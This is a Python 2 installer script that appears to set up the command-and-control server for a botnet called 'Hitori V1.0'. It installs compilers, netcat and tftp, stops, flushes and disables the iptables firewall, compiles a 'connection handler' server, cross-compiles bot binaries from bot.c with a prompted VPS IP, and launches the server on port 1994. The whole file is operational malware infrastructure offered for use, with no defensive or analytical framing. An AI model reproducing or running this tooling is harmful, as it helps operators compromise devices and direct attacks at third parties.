import subprocess,os,sys,random,time,urllib2,subprocess
#!/usr/bin/env python

 
def run(cmd):
    subprocess.call(cmd, shell=True)
 
time.sleep(5)
print("\x1b[1;37minstalling needed dependicies please wait\x1b[1;32m...\x1b[0m")
run("yum update -y")
run("yum install gcc python-paramiko -y")
run("yum install python nano gcc wget screen -y")
run("yum install nano -y")
run("yum install cpan perl python python-paramiko gcc nano wget nc screen psmisc bzip2 -y")
run("yum install epel-release -y")
run("yum install gmp-devel -y")
run("ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10")
run("yum install screen wget bzip2 gcc gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y")
run("service iptables stop")
run("chkconfig iptables off")
print("\x1b[1;37mall dependicies installed\x1b[1;32m...\x1b[0m")
time.sleep(5)
print("\x1b[1;37mMake your login\x1b[1;32m...\x1b[0m")
time.sleep(5)
run("nano login.txt")
time.sleep(5)
time.sleep(5)
print("\x1b[1;37mLOGIN \x1b[1;32mSUCCESSFULLY \x1b[1;37mMADE\x1b[1;32m...\x1b[0m")
time.sleep(5)
print("\x1b[1;32m--------------------------\x1b[0m")
run("gcc -o server server.c -pthread")
print("\x1b[1;37mNO \x1b[0;31mERRORS\x1b[1;37m?\x1b[1;32m...\x1b[0m")
print("\x1b[1;37mNOW THAT WE COMPILED OUR CONNECTION HANDLER\x1b[0m")
print("\x1b[1;37m Hitori V1.0 BINARYS\x1b[0m")
print("\x1b[1;32m--------------------------\x1b[0m")
time.sleep(5)
time.sleep(5)
time.sleep(5)
print("\x1b[1;37mPlease wait\x1b[1;32m...\x1b[0m")
time.sleep(5)
print("\x1b[0;33mits gonna ask you to Enter option do 1 and enter\x1b[0m")
time.sleep(5)
print("\x1b[1;32mits gonna ask you to Enter option do 1 and enter\x1b[0m")
time.sleep(5)
print("\x1b[1;36mits gonna ask you to Enter option do 1 and enter\x1b[0m")
option = input ("Enter Option: ")
if option == 1:
    print ("\x1b[1;37mCompling archs...")
    time.sleep(2)
    cc = raw_input("\x1b[0;37mTYPE python: ")
    ccfile = raw_input("\x1b[0;37mTYPE cc.py: ")
    bot = raw_input("\x1b[0;37mTYPE bot.c: ")
    ip = raw_input("\x1b[0;37mVPS IP HERE: ");
    run (""+cc+" "+ccfile+" "+bot+" "+ip+"")
time.sleep(5)
time.sleep(5)
time.sleep(5)
print("\x1b[0;32mscreen ./server 1994 500 1\x1b[0m")
time.sleep(5)
run("ulimit -n 999999")
run("iptables -F")
run("screen ./server 1994 500 1")